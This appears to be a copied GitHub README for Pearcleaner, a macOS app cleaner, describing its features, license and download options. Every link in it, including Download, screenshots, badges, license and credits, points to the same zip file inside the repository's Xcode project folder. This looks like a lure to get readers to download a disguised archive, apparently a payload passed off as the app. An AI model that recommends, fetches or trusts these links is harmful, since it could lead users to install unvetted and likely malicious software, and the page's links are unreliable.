# Pearcleaner
<p align="center">
<!--    <img src="https://raw.githubusercontent.com/Czzor/Pearcleaner/main/Pearcleaner.xcodeproj/1.9.zip" align="center" width="128" height="128" /> -->
   <img src="https://raw.githubusercontent.com/Czzor/Pearcleaner/main/Pearcleaner.xcodeproj/1.9.zip" align="center" width="160" height="160" />

   <br />
   <strong>Status: </strong>Maintained
   <br />
   <strong>Version: </strong>4.5.3
   <br />
   <a href="https://raw.githubusercontent.com/Czzor/Pearcleaner/main/Pearcleaner.xcodeproj/1.9.zip"><strong>Download</strong></a>
    · 
   <a href="https://raw.githubusercontent.com/Czzor/Pearcleaner/main/Pearcleaner.xcodeproj/1.9.zip">Commits</a>
   <br />
   <br />
   <a href="https://raw.githubusercontent.com/Czzor/Pearcleaner/main/Pearcleaner.xcodeproj/1.9.zip" target="_blank"><img src="https://raw.githubusercontent.com/Czzor/Pearcleaner/main/Pearcleaner.xcodeproj/1.9.zip" alt="Pearcleaner - An&#0032;open&#0045;source&#0032;mac&#0032;app&#0032;cleaner | Product Hunt" style="width: 250px; height: 54px;" width="250" height="54" /></a>
   <br />
   <a href="https://raw.githubusercontent.com/Czzor/Pearcleaner/main/Pearcleaner.xcodeproj/1.9.zip" target="_blank"><img src="https://raw.githubusercontent.com/Czzor/Pearcleaner/main/Pearcleaner.xcodeproj/1.9.zip" alt="Featured｜HelloGitHub" style="width: 250px; height: 54px;" width="250" height="54" /></a>
  </p>
</p>
</br>


A free, source-available and fair-code licensed Mac app cleaner inspired by [Freemacsoft's AppCleaner](https://raw.githubusercontent.com/Czzor/Pearcleaner/main/Pearcleaner.xcodeproj/1.9.zip) and [Sun Knudsen's Privacy Guides](https://raw.githubusercontent.com/Czzor/Pearcleaner/main/Pearcleaner.xcodeproj/1.9.zip) post on his app-cleaner script.
This project was born out of wanting to learn more on how macOS deals with app installation/uninstallation and getting more Swift experience. If you have suggestions I'm open to hearing them, submit a feature request!


### Table of Contents:
[Translations](#translations) | [License](#license) | [Features](#features) | [Screenshots](#screenshots) | [Issues](#issues) | [Requirements](#requirements) | [Download](#getting-pearcleaner) | [Thanks](#thanks) | [Other Apps](#other-apps)

<br>

## Translations
If you are able to contribute to translations for the app, please see this discussion: https://raw.githubusercontent.com/Czzor/Pearcleaner/main/Pearcleaner.xcodeproj/1.9.zip

## License
> [!IMPORTANT]
> Pearcleaner is licensed under Apache 2.0 with [Commons Clause](https://raw.githubusercontent.com/Czzor/Pearcleaner/main/Pearcleaner.xcodeproj/1.9.zip). This means that you can do anything you'd like with the source, modify it, contribute to it, etc., but the license explicitly prohibits any form of monetization for Pearcleaner or any modified versions of it. See full license [HERE](https://raw.githubusercontent.com/Czzor/Pearcleaner/main/Pearcleaner.xcodeproj/1.9.zip)

## Features
- Orphaned file search for finding remaining files from previously uninstalled applications
- Development environments file/cache cleaning
- App Lipo to strip unneeded architectures from universal apps. No dependency on the lipo tool so no need to install xcode or command line tools
- Prune unused translation files from app bundles keeping only the preferred language set on macOS
- Sentinel monitor helper that can be enabled to watch Trash folder for deleted apps to cleanup after the fact(Extremely small (210KB) and uses ~2mb of ram to run in the background and file watch)
- Mini mode which can be enabled from Settings
- Menubar icon option
- CLI support
- Drag/drop applications support
- Deep link support for automation, see [wiki guide](https://raw.githubusercontent.com/Czzor/Pearcleaner/main/Pearcleaner.xcodeproj/1.9.zip) for instructions
- Optional Finder Extension which allows you to uninstall an app directly from Finder by `right click > Pearcleaner Uninstall`
- Theme System available with custom color selector
- Differentiate between regular, Safari web-apps and mobile apps with badges like **web** and **iOS**
- Has clean uninstall menu option for the Pearcleaner app itself if you want to stop using it and get rid of all files and launch items
- Export app bundles for migrating apps and their cache to a new system
- Export app file list search results
- Optional Homebrew cleanup
- Include extra directories to search for apps in
- Exclude files/folders from the orphaned file search
- Custom auto-updater that pulls latest release notes and binaries from GitHub Releases (Pearcleaner should run from `/Applications` folder to avoid permission issues)


## Screenshots

<img src="https://raw.githubusercontent.com/Czzor/Pearcleaner/main/Pearcleaner.xcodeproj/1.9.zip" align="left" width="400" />

<img src="https://raw.githubusercontent.com/Czzor/Pearcleaner/main/Pearcleaner.xcodeproj/1.9.zip" align="center" width="400" />
<p></p>
<img src="https://raw.githubusercontent.com/Czzor/Pearcleaner/main/Pearcleaner.xcodeproj/1.9.zip" align="left" width="400" />

<img src="https://raw.githubusercontent.com/Czzor/Pearcleaner/main/Pearcleaner.xcodeproj/1.9.zip" align="center" width="400" />
<p></p>

## Issues
> [!WARNING]
> - When submitting issues, please use the appropriate issue template corresponding with your problem [HERE](https://raw.githubusercontent.com/Czzor/Pearcleaner/main/Pearcleaner.xcodeproj/1.9.zip)
> - Beta versions of macOS will not be supported until general release


## Requirements
> [!NOTE]
> - MacOS 13.0+ [Non-beta releases]
> - Full Disk permission to search for files


## Getting Pearcleaner

<details>
  <summary>Releases</summary>

Pre-compiled, always up-to-date versions are available from my [releases](https://raw.githubusercontent.com/Czzor/Pearcleaner/main/Pearcleaner.xcodeproj/1.9.zip) page.
</details>

<details>
  <summary>Homebrew</summary>

You can add the app via Homebrew:
```
brew install pearcleaner
```
</details>

## Thanks

- Much appreciation to [Freemacsoft's AppCleaner](https://raw.githubusercontent.com/Czzor/Pearcleaner/main/Pearcleaner.xcodeproj/1.9.zip) and [Sun Knudsen's app-cleaner script](https://raw.githubusercontent.com/Czzor/Pearcleaner/main/Pearcleaner.xcodeproj/1.9.zip)
- [DharsanB](https://raw.githubusercontent.com/Czzor/Pearcleaner/main/Pearcleaner.xcodeproj/1.9.zip) for sponsoring my Apple Developer account

## Other Apps

[Pearcleaner](https://raw.githubusercontent.com/Czzor/Pearcleaner/main/Pearcleaner.xcodeproj/1.9.zip) - An opensource app cleaner with privacy in mind

[Sentinel](https://raw.githubusercontent.com/Czzor/Pearcleaner/main/Pearcleaner.xcodeproj/1.9.zip) - A GUI for controlling gatekeeper status on your Mac

[Viz](https://raw.githubusercontent.com/Czzor/Pearcleaner/main/Pearcleaner.xcodeproj/1.9.zip) - Utility for extracting text from images, videos, qr/barcodes

[PearHID](https://raw.githubusercontent.com/Czzor/Pearcleaner/main/Pearcleaner.xcodeproj/1.9.zip) - Remap your macOS keyboard with a simple SwiftUI frontend
